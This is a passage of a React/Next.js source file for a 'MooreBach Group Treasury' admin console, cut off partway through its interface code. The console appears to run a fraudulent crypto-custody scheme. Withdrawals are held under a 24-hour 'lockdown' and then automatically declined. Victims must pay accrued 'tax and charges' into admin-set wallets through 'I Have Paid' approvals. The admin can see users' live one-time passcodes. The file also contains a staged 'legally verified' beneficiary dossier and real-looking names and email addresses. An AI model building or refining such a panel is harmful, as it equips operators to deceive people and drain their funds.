'use client';

import React, { useState, useEffect, useCallback } from 'react';
import { Menu, RefreshCw } from 'lucide-react';
import { AdminLockScreen } from '@/components/admin/AdminLockScreen';
import { AdminSidebar } from '@/components/admin/AdminSidebar';
import { OverviewTab } from '@/components/admin/OverviewTab';
import { EmailComposerTab } from '@/components/admin/EmailComposerTab';
import { WithdrawalsTab } from '@/components/admin/WithdrawalsTab';
import { TaxChargesTab } from '@/components/admin/TaxChargesTab';
import { VaultsTab } from '@/components/admin/VaultsTab';
import { TwoFactorTab } from '@/components/admin/TwoFactorTab';
import { ProfileTab, BeneficiaryTab } from '@/components/admin/ProfileAndBeneficiaryTabs';
import {
  ScannerTab,
  SessionsTab,
  SecurityTab,
} from '@/components/admin/ScannerSessionsSecurityTabs';
import {
  AdminTabId,
  BeneficiaryInfo,
  OtpLog,
  PrincipalProfile,
  SessionItem,
  StatusBanner,
  TwoFactorSettings,
  VaultAddresses,
  WithdrawalConfig,
  WithdrawalRequest,
  saloSecondaryBtn,
} from '@/components/admin/types';
import type { SentEmailRecord, SmtpSummary } from '@/lib/email/service';
import type { GeminiAdminConfigSummary } from '@/lib/ai/types';
import {
  AccruedChargesSummary,
  TOTAL_ACCRUED_TAX_AND_CHARGES,
} from '@/lib/charges/schedule';

const TAB_META: Record<AdminTabId, { title: string; subtitle: string }> = {
  overview: {
    title: 'Overview',
    subtitle: 'Treasury status, pending disbursements & outbound mail telemetry',
  },
  email: {
    title: 'Email Studio',
    subtitle: 'AI-assisted email drafting, corporate layouts & approval workflow',
  },
  withdrawals: {
    title: 'Withdrawals',
    subtitle: 'Disbursement queue, cooldown toggles & post-lockdown notices',
  },
  charges: {
    title: 'Tax Settlement',
    subtitle: 'Payment wallets & sequential "I Have Paid" approvals',
  },
  vaults: {
    title: 'Vault Wallets',
    subtitle: 'Custody deposit addresses & blockchain node verification',
  },
  'two-factor': {
    title: '2FA & OTP Radar',
    subtitle: 'Live OTP challenges & shared SMTP relay configuration',
  },
  scanner: {
    title: 'Chain Scanner',
    subtitle: 'Multi-chain inbound deposit verification telemetry',
  },
  sessions: {
    title: 'Device Sessions',
    subtitle: 'Active browser sessions & revocation controls',
  },
  profile: {
    title: 'Principal Profile',
    subtitle: 'Primary account identity & executive portrait',
  },
  beneficiary: {
    title: 'Sole Beneficiary',
    subtitle: 'Succession charter dossier & verification status',
  },
  security: {
    title: 'Security',
    subtitle: 'Master passkey rotation & global session revocation',
  },
};

function compressImageToDataUrl(file: File, maxDim = 420): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => {
      const img = new Image();
      img.onload = () => {
        const scale = Math.min(1, maxDim / Math.max(img.width, img.height));
        const w = Math.max(1, Math.round(img.width * scale));
        const h = Math.max(1, Math.round(img.height * scale));
        const canvas = document.createElement('canvas');
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        if (!ctx) {
          resolve(String(reader.result || ''));
          return;
        }
        ctx.drawImage(img, 0, 0, w, h);
        resolve(canvas.toDataURL('image/jpeg', 0.86));
      };
      img.onerror = () => resolve(String(reader.result || ''));
      img.src = String(reader.result || '');
    };
    reader.onerror = () => reject(new Error('Failed to read image file'));
    reader.readAsDataURL(file);
  });
}

export default function SaloAdminPortal() {
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [isCheckingSession, setIsCheckingSession] = useState(true);
  const [masterKey, setMasterKey] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [authError, setAuthError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const [activeTab, setActiveTab] = useState<AdminTabId>('overview');
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const [isSyncingAll, setIsSyncingAll] = useState(false);

  // Email Studio & AI State
  const [emailHistory, setEmailHistory] = useState<SentEmailRecord[]>([]);
  const [smtpSummary, setSmtpSummary] = useState<SmtpSummary | null>(null);
  const [geminiConfig, setGeminiConfig] = useState<GeminiAdminConfigSummary | null>(null);

  // Vaults State
  const [addresses, setAddresses] = useState<VaultAddresses>({
    USDT_TRC20: '',
    USDT_ERC20: '',
    BTC: '',
    ETH: '',
  });
  const [isSavingAddresses, setIsSavingAddresses] = useState(false);
  const [addressStatus, setAddressStatus] = useState<StatusBanner | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Scanner State
  const [scanResults, setScanResults] = useState<any[]>([]);
  const [isScanningAll, setIsScanningAll] = useState(false);
  const [isCheckingNode, setIsCheckingNode] = useState<string | null>(null);
  const [nodeCheckResult, setNodeCheckResult] = useState<Record<string, any>>({});

  // Withdrawals State
  const [withdrawalConfig, setWithdrawalConfig] = useState<WithdrawalConfig>({
    minAmount: 10,
    maxAmount: 5000000,
    dailyLimit: 2500000,
    allowedRails: {
      fedwire: true,
      crypto: true,
      swift: true,
      debit: false,
    },
    requireTwoFactor: true,
    lockdown24hEnabled: true,
    postLockdownDeclineEnabled: true,
    declineTriggerMode: 'immediate',
    declineTitle: 'Payment Declined',
    declineMessage:
      'Oops! Sorry your withdrawal cannot be completed. Please contact support',
    declineSupportEmail: 'support@moorebachgroup.com',
    declineButtonText: 'Contact Support',
    lastUpdated: 0,
  });
  const [isSavingWithdrawals, setIsSavingWithdrawals] = useState(false);
  const [isClearingCooldown, setIsClearingCooldown] = useState(false);
  const [withdrawalStatusMsg, setWithdrawalStatusMsg] = useState<StatusBanner | null>(null);
  const [withdrawalRequests, setWithdrawalRequests] = useState<WithdrawalRequest[]>([]);

  // Tax Settlement State
  const [chargesSummary, setChargesSummary] = useState<AccruedChargesSummary>({
    totalAccrued: TOTAL_ACCRUED_TAX_AND_CHARGES,
    totalApprovedPaid: 0,
    totalPendingVerification: 0,
    remainingBalance: TOTAL_ACCRUED_TAX_AND_CHARGES,
    progressPercent: 0,
    isFullySettled: false,
    wallets: [],
    payments: [],
  });
  const [isLoadingCharges, setIsLoadingCharges] = useState(false);
  const [chargesStatusMsg, setChargesStatusMsg] = useState<StatusBanner | null>(null);

  // Sessions State
  const [sessions, setSessions] = useState<SessionItem[]>([]);

  // 2FA & SMTP State
  const [twoFactorSettings, setTwoFactorSettings] = useState<TwoFactorSettings>({
    enabled: true,
    notifyEmail: 'declansalo1@gmail.com',
    resendConfigured: false,
    resendStatus: 'missing',
    smtpHost: 'mail.privateemail.com',
    smtpPort: 465,
    smtpUser: 'support@moorebachgroup.com',
    smtpPassSet: false,
    smtpFrom: 'MooreBach Group Treasury <support@moorebachgroup.com>',
  });
  const [resendApiKeyInput, setResendApiKeyInput] = useState('');
  const [showResendKey, setShowResendKey] = useState(false);
  const [isRemovingResendKey, setIsRemovingResendKey] = useState(false);
  const [smtpPassInput, setSmtpPassInput] = useState('');
  const [showSmtpPass, setShowSmtpPass] = useState(false);
  const [otpLogs, setOtpLogs] = useState<OtpLog[]>([]);
  const [isSaving2FA, setIsSaving2FA] = useState(false);
  const [twoFactorStatusMsg, setTwoFactorStatusMsg] = useState<StatusBanner | null>(null);
  const [copiedOtp, setCopiedOtp] = useState<string | null>(null);

  // Profile State
  const [principalProfile, setPrincipalProfile] = useState<PrincipalProfile>({
    name: 'Declan Salo',
    email: 'declansalo1@gmail.com',
    location: 'Nashville, TN (United States)',
    avatarUrl: '',
    role: 'Primary Portfolio Principal',
  });
  const [isSavingProfile, setIsSavingProfile] = useState(false);
  const [profileStatusMsg, setProfileStatusMsg] = useState<StatusBanner | null>(null);

  // Beneficiary State
  const [beneficiaryForm, setBeneficiaryForm] = useState<BeneficiaryInfo>({
    name: 'Elena Rostova',
    relationship: 'Sole Primary Beneficiary (100% Allocation)',
    email: 'elena.rostova@icloud.com',
    address: '1200 Broadway, Penthouse 42B, Nashville, TN 37203, United States',
    avatarUrl: '',
    status: 'Active & Legally Verified',
    allocation: '100% Primary Custody',
    designationDate: 'April 12, 2026',
    covenantId: 'MBG-BEN-88429-PRI',
    notes:
      'Irrevocable sole primary beneficiary designated under MooreBach Institutional Custody Charter §4.2.',
  });
  const [isSavingBeneficiary, setIsSavingBeneficiary] = useState(false);
  const [beneficiaryStatusMsg, setBeneficiaryStatusMsg] = useState<StatusBanner | null>(null);

  // Security Password State
  const [currentPassInput, setCurrentPassInput] = useState('');
  const [newPassInput, setNewPassInput] = useState('');
  const [confirmPassInput, setConfirmPassInput] = useState('');
  const [isUpdatingPassword, setIsUpdatingPassword] = useState(false);
  const [passwordStatus, setPasswordStatus] = useState<StatusBanner | null>(null);

  // Loaders
  const loadVaultAddresses = useCallback(async (key: string) => {
    try {
      const res = await fetch('/api/crypto/config', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success && data.addresses) setAddresses(data.addresses);
    } catch {}
  }, []);

  const loadAdminConfig = useCallback(async (key: string) => {
    try {
      const res = await fetch('/api/admin/config', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success && data.config?.withdrawals) {
        const w = data.config.withdrawals;
        setWithdrawalConfig((prev) => ({
          ...prev,
          ...w,
          lockdown24hEnabled: w.lockdown24hEnabled !== false,
          postLockdownDeclineEnabled: w.postLockdownDeclineEnabled !== false,
          allowedRails: {
            ...prev.allowedRails,
            ...(w.allowedRails || {}),
          },
          lastUpdated: w.lastUpdated || data.config.lastUpdated || Date.now(),
        }));
      }
    } catch {}
  }, []);

  const loadWithdrawalRequests = useCallback(async (key: string) => {
    try {
      const res = await fetch('/api/admin/withdrawals', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success && Array.isArray(data.withdrawals)) {
        setWithdrawalRequests(data.withdrawals);
      }
    } catch {}
  }, []);

  const loadChargesSummary = useCallback(async (key: string) => {
    setIsLoadingCharges(true);
    try {
      const res = await fetch('/api/admin/charges', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success) {
        setChargesSummary({
          totalAccrued: data.totalAccrued ?? TOTAL_ACCRUED_TAX_AND_CHARGES,
          totalApprovedPaid: data.totalApprovedPaid ?? 0,
          totalPendingVerification: data.totalPendingVerification ?? 0,
          remainingBalance: data.remainingBalance ?? TOTAL_ACCRUED_TAX_AND_CHARGES,
          progressPercent: data.progressPercent ?? 0,
          isFullySettled: Boolean(data.isFullySettled),
          wallets: Array.isArray(data.wallets) ? data.wallets : [],
          payments: Array.isArray(data.payments) ? data.payments : [],
        });
      }
    } catch {
    } finally {
      setIsLoadingCharges(false);
    }
  }, []);

  const loadTwoFactorData = useCallback(async (key: string) => {
    try {
      const res = await fetch('/api/admin/two-factor', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success) {
        if (data.settings) setTwoFactorSettings(data.settings);
        if (Array.isArray(data.logs)) setOtpLogs(data.logs);
      }
    } catch {}
  }, []);

  const loadSessions = useCallback(async (key: string) => {
    try {
      const res = await fetch('/api/auth/sessions', {
        headers: { 'x-salo-key': key },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success && Array.isArray(data.sessions)) {
        setSessions(data.sessions);
      }
    } catch {}
  }, []);

  const loadProfile = useCallback(async () => {
    try {
      const res = await fetch('/api/admin/profile', { cache: 'no-store' });
      const data = await res.json();
      if (data.success && data.profile) setPrincipalProfile(data.profile);
    } catch {}
  }, []);

  const loadBeneficiary = useCallback(async () => {
    try {
      const res = await fetch('/api/admin/beneficiary', { cache: 'no-store' });
      const data = await res.json();
      if (data.success && data.beneficiary) setBeneficiaryForm(data.beneficiary);
    } catch {}
  }, []);

  const loadEmailStudio = useCallback(async (key: string) => {
    try {
      const [emailRes, aiRes] = await Promise.all([
        fetch('/api/admin/email', { headers: { 'x-salo-key': key }, cache: 'no-store' }),
        fetch('/api/admin/ai-config', { headers: { 'x-salo-key': key }, cache: 'no-store' }),
      ]);
      const emailData = await emailRes.json();
      if (emailData.success) {
        if (Array.isArray(emailData.history)) setEmailHistory(emailData.history);
        if (emailData.smtp) setSmtpSummary(emailData.smtp);
      }
      const aiData = await aiRes.json();
      if (aiData.success && aiData.config) {
        setGeminiConfig(aiData.config);
      }
    } catch {}
  }, []);

  const syncAllAdminData = useCallback(
    async (key: string) => {
      setIsSyncingAll(true);
      try {
        await Promise.all([
          loadVaultAddresses(key),
          loadAdminConfig(key),
          loadWithdrawalRequests(key),
          loadChargesSummary(key),
          loadTwoFactorData(key),
          loadSessions(key),
          loadProfile(),
          loadBeneficiary(),
          loadEmailStudio(key),
        ]);
      } finally {
        setIsSyncingAll(false);
      }
    },
    [
      loadVaultAddresses,
      loadAdminConfig,
      loadWithdrawalRequests,
      loadChargesSummary,
      loadTwoFactorData,
      loadSessions,
      loadProfile,
      loadBeneficiary,
      loadEmailStudio,
    ]
  );

  // Restore existing master session cookie and active tab across page reloads & navigation
  useEffect(() => {
    let active = true;
    try {
      const savedTab = sessionStorage.getItem('salo_active_tab') as AdminTabId | null;
      if (savedTab && savedTab in TAB_META) {
        setActiveTab(savedTab);
      }
    } catch {}
    (async () => {
      try {
        const storedToken =
          typeof window !== 'undefined' ? sessionStorage.getItem('salo_master_token') : null;
        const res = await fetch('/api/admin/auth', {
          cache: 'no-store',
          headers: storedToken ? { 'x-master-token': storedToken } : undefined,
        });
        const data = await res.json();
        if (active && data.success && data.authorized) {
          setIsAuthorized(true);
          syncAllAdminData('');
        }
      } catch {
      } finally {
        if (active) setIsCheckingSession(false);
      }
    })();
    return () => {
      active = false;
    };
  }, [syncAllAdminData]);

  // Persist active admin tab across refreshes
  useEffect(() => {
    if (isCheckingSession) return;
    try {
      sessionStorage.setItem('salo_active_tab', activeTab);
    } catch {}
  }, [activeTab, isCheckingSession]);

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    setIsVerifying(true);
    try {
      const res = await fetch('/api/admin/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: passwordInput }),
      });
      const data = await res.json();
      if (data.success && data.authorized) {
        if (data.token && typeof window !== 'undefined') {
          try {
            sessionStorage.setItem('salo_master_token', data.token);
          } catch {}
        }
        setMasterKey(passwordInput);
        setIsAuthorized(true);
        syncAllAdminData(passwordInput);
      } else {
        setAuthError(
          data.error ||
            'Unauthorized Master Key. Only Declan Salo may access the administrative console.'
        );
      }
    } catch {
      setAuthError('Authentication gateway error. Please retry.');
    } finally {
      setIsVerifying(false);
    }
  };

  useEffect(() => {
    if (!isAuthorized) return;
    const interval = setInterval(() => {
      loadTwoFactorData(masterKey);
      loadSessions(masterKey);
      loadWithdrawalRequests(masterKey);
      loadChargesSummary(masterKey);
    }, 4500);
    return () => clearInterval(interval);
  }, [isAuthorized, masterKey, loadTwoFactorData, loadSessions, loadWithdrawalRequests, loadChargesSummary]);

  const handleSaveAddresses = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingAddresses(true);
    setAddressStatus(null);
    try {
      const res = await fetch('/api/crypto/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ addresses }),
      });
      const data = await res.json();
      if (data.success) {
        setAddressStatus({
          type: 'success',
          message: 'Vault deposit addresses updated across SQLite & GitHub Gist.',
        });
      } else {
        setAddressStatus({ type: 'error', message: data.error || 'Failed to update addresses.' });
      }
    } catch {
      setAddressStatus({ type: 'error', message: 'Network error while saving addresses.' });
    } finally {
      setIsSavingAddresses(false);
    }
  };

  const handleCheckNode = async (
    asset: 'USDT' | 'BTC' | 'ETH',
    network: string,
    address: string,
    key: string
  ) => {
    setIsCheckingNode(key);
    try {
      const res = await fetch('/api/crypto/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ asset, network, address }),
      });
      const data = await res.json();
      setNodeCheckResult((prev) => ({ ...prev, [key]: data }));
    } catch {
    } finally {
      setIsCheckingNode(null);
    }
  };

  const handleScanAll = async () => {
    setIsScanningAll(true);
    try {
      const res = await fetch('/api/crypto/scan', {
        headers: { 'x-salo-key': masterKey },
        cache: 'no-store',
      });
      const data = await res.json();
      if (data.success) setScanResults(data.results || []);
    } catch {
    } finally {
      setIsScanningAll(false);
    }
  };

  const broadcastRealtimeConfigUpdate = () => {
    try {
      const bc = new BroadcastChannel('moback_realtime_sync');
      bc.postMessage({ type: 'ADMIN_CONFIG_UPDATED', at: Date.now() });
      bc.close();
    } catch {}
    try {
      localStorage.setItem('moback_realtime_ping', String(Date.now()));
    } catch {}
  };

  const persistWithdrawalConfig = async (nextConfig: WithdrawalConfig, customSuccessMsg?: string) => {
    setWithdrawalConfig(nextConfig);
    setIsSavingWithdrawals(true);
    setWithdrawalStatusMsg(null);
    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ withdrawals: nextConfig }),
      });
      const data = await res.json();
      if (data.success) {
        if (data.config?.withdrawals) {
          setWithdrawalConfig((prev) => ({
            ...prev,
            ...data.config.withdrawals,
            allowedRails: {
              ...prev.allowedRails,
              ...(data.config.withdrawals.allowedRails || {}),
            },
          }));
        }
        broadcastRealtimeConfigUpdate();
        setWithdrawalStatusMsg({
          type: 'success',
          message: customSuccessMsg || 'Withdrawal policies saved & synchronized live.',
        });
      } else {
        setWithdrawalStatusMsg({ type: 'error', message: data.error || 'Failed to save config.' });
      }
    } catch {
      setWithdrawalStatusMsg({ type: 'error', message: 'Network error saving config.' });
    } finally {
      setIsSavingWithdrawals(false);
    }
  };

  const handleSaveWithdrawals = async (e: React.FormEvent) => {
    e.preventDefault();
    await persistWithdrawalConfig(withdrawalConfig);
  };

  const handleClearLockdownCooldown = async () => {
    setIsClearingCooldown(true);
    setWithdrawalStatusMsg(null);
    try {
      const res = await fetch('/api/admin/withdrawals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ action: 'clear-lockdown' }),
      });
      const data = await res.json();
      if (data.success) {
        broadcastRealtimeConfigUpdate();
        setWithdrawalStatusMsg({
          type: 'success',
          message: data.message || '24-hour security cooldown cleared.',
        });
      } else {
        setWithdrawalStatusMsg({ type: 'error', message: data.error || 'Failed to clear cooldown.' });
      }
    } catch {
      setWithdrawalStatusMsg({ type: 'error', message: 'Network error clearing cooldown.' });
    } finally {
      setIsClearingCooldown(false);
    }
  };

  const handleUpdateWithdrawalStatus = async (id: string, status: string, reason?: string) => {
    try {
      const res = await fetch('/api/admin/withdrawals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ id, status, reason }),
      });
      const data = await res.json();
      if (data.success && Array.isArray(data.withdrawals)) {
        setWithdrawalRequests(data.withdrawals);
      }
    } catch {}
  };

  const handleConfirmTransfer = async (id: string, txHash: string) => {
    setWithdrawalStatusMsg(null);
    const res = await fetch('/api/admin/withdrawals', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
      body: JSON.stringify({ id, action: 'transfer', txHash }),
    });
    const data = await res.json();
    if (data.success) {
      if (Array.isArray(data.withdrawals)) setWithdrawalRequests(data.withdrawals);
      setWithdrawalStatusMsg({
        type: 'success',
        message: data.message || 'Disbursement confirmed; receipt & email dispatched.',
      });
    } else {
      setWithdrawalStatusMsg({
        type: 'error',
        message: data.error || 'Failed to mark transfer.',
      });
    }
  };

  const runAdminChargesAction = async (payload: Record<string, any>) => {
    setChargesStatusMsg(null);
    try {
      const res = await fetch('/api/admin/charges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.success) {
        setChargesSummary({
          totalAccrued: data.totalAccrued ?? TOTAL_ACCRUED_TAX_AND_CHARGES,
          totalApprovedPaid: data.totalApprovedPaid ?? 0,
          totalPendingVerification: data.totalPendingVerification ?? 0,
          remainingBalance: data.remainingBalance ?? TOTAL_ACCRUED_TAX_AND_CHARGES,
          progressPercent: data.progressPercent ?? 0,
          isFullySettled: Boolean(data.isFullySettled),
          wallets: Array.isArray(data.wallets) ? data.wallets : [],
          payments: Array.isArray(data.payments) ? data.payments : [],
        });
        setChargesStatusMsg({
          type: 'success',
          message: data.message || 'Tax settlement record updated.',
        });
      } else {
        setChargesStatusMsg({
          type: 'error',
          message: data.error || 'Failed to update tax settlement record.',
        });
      }
    } catch {
      setChargesStatusMsg({
        type: 'error',
        message: 'Network error updating tax settlement data.',
      });
    }
  };

  const handleUpsertChargeWallet = async (wallet: {
    id?: string;
    label: string;
    asset: string;
    network: string;
    address: string;
    instructions?: string;
    enabled?: boolean;
  }) => {
    await runAdminChargesAction({ action: 'upsert_wallet', ...wallet });
  };

  const handleToggleChargeWallet = async (id: string, enabled: boolean) => {
    await runAdminChargesAction({ action: 'toggle_wallet', id, enabled });
  };

  const handleDeleteChargeWallet = async (id: string) => {
    await runAdminChargesAction({ action: 'delete_wallet', id });
  };

  const handleReviewChargePayment = async (input: {
    id: string;
    action: 'approve' | 'reject';
    confirmedAmount?: number;
    adminNote?: string;
  }) => {
    await runAdminChargesAction({
      action: input.action === 'approve' ? 'approve_payment' : 'reject_payment',
      id: input.id,
      confirmedAmount: input.confirmedAmount,
      adminNote: input.adminNote,
    });
  };

  const handleSave2FA = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSaving2FA(true);
    setTwoFactorStatusMsg(null);
    try {
      const res = await fetch('/api/admin/two-factor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({
          enabled: twoFactorSettings.enabled,
          notifyEmail: twoFactorSettings.notifyEmail,
          resendApiKey: resendApiKeyInput.trim() || undefined,
          smtpHost: twoFactorSettings.smtpHost,
          smtpPort: Number(twoFactorSettings.smtpPort) || 465,
          smtpUser: twoFactorSettings.smtpUser,
          smtpPass: smtpPassInput || undefined,
          smtpFrom: twoFactorSettings.smtpFrom,
        }),
      });
      const data = await res.json();
      if (data.success) {
        if (data.settings) setTwoFactorSettings(data.settings);
        setResendApiKeyInput('');
        setSmtpPassInput('');
        setTwoFactorStatusMsg({
          type: 'success',
          message: resendApiKeyInput.trim()
            ? 'Verified Resend API key live & saved official MooreBach Group mail settings.'
            : 'Official MooreBach Group mail & 2FA settings saved (secrets encrypted locally).',
        });
        loadEmailStudio(masterKey);
      } else {
        setTwoFactorStatusMsg({
          type: 'error',
          message: data.error || 'Failed to save 2FA settings.',
        });
      }
    } catch {
      setTwoFactorStatusMsg({ type: 'error', message: 'Network error updating 2FA settings.' });
    } finally {
      setIsSaving2FA(false);
    }
  };

  const handleRemoveResendKey = async () => {
    setIsRemovingResendKey(true);
    setTwoFactorStatusMsg(null);
    try {
      const res = await fetch('/api/admin/two-factor', {
        method: 'DELETE',
        headers: { 'x-salo-key': masterKey },
      });
      const data = await res.json();
      if (data.success) {
        if (data.settings) setTwoFactorSettings(data.settings);
        setResendApiKeyInput('');
        setTwoFactorStatusMsg({
          type: 'success',
          message: 'Removed Resend API key. Paste a new verified key below to re-enable delivery.',
        });
        loadEmailStudio(masterKey);
      } else {
        setTwoFactorStatusMsg({
          type: 'error',
          message: data.error || 'Failed to remove Resend API key.',
        });
      }
    } catch {
      setTwoFactorStatusMsg({ type: 'error', message: 'Network error removing Resend API key.' });
    } finally {
      setIsRemovingResendKey(false);
    }
  };

  const handleSaveProfile = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingProfile(true);
    setProfileStatusMsg(null);
    try {
      const res = await fetch('/api/admin/profile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify(principalProfile),
      });
      const data = await res.json();
      if (data.success) {
        if (data.profile) setPrincipalProfile(data.profile);
        setProfileStatusMsg({
          type: 'success',
          message: 'Principal profile and portrait updated.',
        });
      } else {
        setProfileStatusMsg({ type: 'error', message: data.error || 'Failed to update profile.' });
      }
    } catch {
      setProfileStatusMsg({ type: 'error', message: 'Network error saving profile.' });
    } finally {
      setIsSavingProfile(false);
    }
  };

  const handleSaveBeneficiary = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingBeneficiary(true);
    setBeneficiaryStatusMsg(null);
    try {
      const res = await fetch('/api/admin/beneficiary', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify(beneficiaryForm),
      });
      const data = await res.json();
      if (data.success) {
        if (data.beneficiary) setBeneficiaryForm(data.beneficiary);
        setBeneficiaryStatusMsg({
          type: 'success',
          message: 'Beneficiary dossier updated & synchronized.',
        });
      } else {
        setBeneficiaryStatusMsg({
          type: 'error',
          message: data.error || 'Failed to save beneficiary dossier.',
        });
      }
    } catch {
      setBeneficiaryStatusMsg({
        type: 'error',
        message: 'Network error saving beneficiary dossier.',
      });
    } finally {
      setIsSavingBeneficiary(false);
    }
  };

  const handlePhotoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    try {
      const dataUrl = await compressImageToDataUrl(file);
      setPrincipalProfile((prev) => ({ ...prev, avatarUrl: dataUrl }));
    } catch {}
  };

  const handleBeneficiaryPhotoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    try {
      const dataUrl = await compressImageToDataUrl(file);
      setBeneficiaryForm((prev) => ({ ...prev, avatarUrl: dataUrl }));
    } catch {}
  };

  const handleRevokeSession = async (sessionId: string) => {
    try {
      const res = await fetch('/api/auth/sessions/revoke', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({ sessionId, reason: 'Revoked via Salo Admin Console' }),
      });
      if ((await res.json()).success) loadSessions(masterKey);
    } catch {}
  };

  const handleKillAllOtherSessions = async () => {
    try {
      const res = await fetch('/api/auth/sessions/revoke', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({
          revokeAllOthers: true,
          reason: 'Emergency Kill Switch Activated by Declan Salo',
        }),
      });
      if ((await res.json()).success) loadSessions(masterKey);
    } catch {}
  };

  const handleUpdatePassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setPasswordStatus(null);
    if (newPassInput !== confirmPassInput) {
      setPasswordStatus({ type: 'error', message: 'New passwords do not match.' });
      return;
    }
    if (newPassInput.length < 6) {
      setPasswordStatus({ type: 'error', message: 'Password must be at least 6 characters.' });
      return;
    }

    setIsUpdatingPassword(true);
    try {
      const res = await fetch('/api/auth/password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-salo-key': masterKey },
        body: JSON.stringify({
          currentPassword: currentPassInput,
          newPassword: newPassInput,
          revokeOthers: true,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setMasterKey(newPassInput);
        setCurrentPassInput('');
        setNewPassInput('');
        setConfirmPassInput('');
        setPasswordStatus({
          type: 'success',
          message: 'Master passkey updated and other device sessions terminated.',
        });
      } else {
        setPasswordStatus({ type: 'error', message: data.error || 'Failed to update password.' });
      }
    } catch {
      setPasswordStatus({ type: 'error', message: 'Error communicating with authentication API.' });
    } finally {
      setIsUpdatingPassword(false);
    }
  };

  const handleLockTerminal = async () => {
    try {
      await fetch('/api/admin/auth', { method: 'DELETE' });
    } catch {}
    try {
      sessionStorage.removeItem('salo_master_token');
    } catch {}
    setIsAuthorized(false);
    setMasterKey('');
    setPasswordInput('');
  };

  if (isCheckingSession) {
    return (
      <div
        style={{
          minHeight: '100vh',
          backgroundColor: '#f9fafb',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          fontSize: '13px',
          color: '#6b7280',
          fontWeight: 500,
        }}
      >
        Restoring console session...
      </div>
    );
  }

  if (!isAuthorized) {
    return (
      <AdminLockScreen
        passwordInput={passwordInput}
        setPasswordInput={setPasswordInput}
        showPassword={showPassword}
        setShowPassword={setShowPassword}
        isVerifying={isVerifying}
        authError={authError}
        onUnlock={handleUnlock}
      />
    );
  }

  const pendingWithdrawalsCount = withdrawalRequests.filter(
    (w) => w.status !== 'completed' && w.status !== 'transferred' && w.status !== 'rejected'
  ).length;
  const pendingChargePaymentsCount = chargesSummary.payments.filter(
    (p) => p.status === 'pending'
  ).length;
  const activeOtpsCount = otpLogs.filter((o) => !o.used && o.expiresAt > Date.now()).length;
  const activeSessionsCount = sessions.filter((s) => !s.isRevoked).length;
  const activeMeta = TAB_META[activeTab];

  return (
    <div className="salo-shell">
      <AdminSidebar
        activeTab={activeTab}
        onSelectTab={setActiveTab}
        isOpenMobile={mobileNavOpen}
        onCloseMobile={() => setMobileNavOpen(false)}
        onLockTerminal={handleLockTerminal}
        principalProfile={principalProfile}
        badges={{
          pendingWithdrawals: pendingWithdrawalsCount,
          pendingChargePayments: pendingChargePaymentsCount,
          activeOtps: activeOtpsCount,
          activeSessions: activeSessionsCount,
          sentEmails: emailHistory.filter((e) => e.status === 'sent').length,
        }}
      />

      <div className="salo-main-wrap">
        <div className="salo-topbar">
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px', minWidth: 0 }}>
            <button
              type="button"
              onClick={() => setMobileNavOpen(true)}
              className="salo-mobile-menu-trigger"
              aria-label="Open admin menu"
              style={{
                backgroundColor: '#ffffff',
                border: '1px solid #d1d5db',
                borderRadius: '6px',
                color: '#374151',
                width: '32px',
                height: '32px',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                flexShrink: 0,
              }}
            >
              <Menu style={{ width: '16px', height: '16px' }} />
            </button>
            <div style={{ minWidth: 0 }}>
              <h1
                style={{
                  fontSize: '15px',
                  fontWeight: 600,
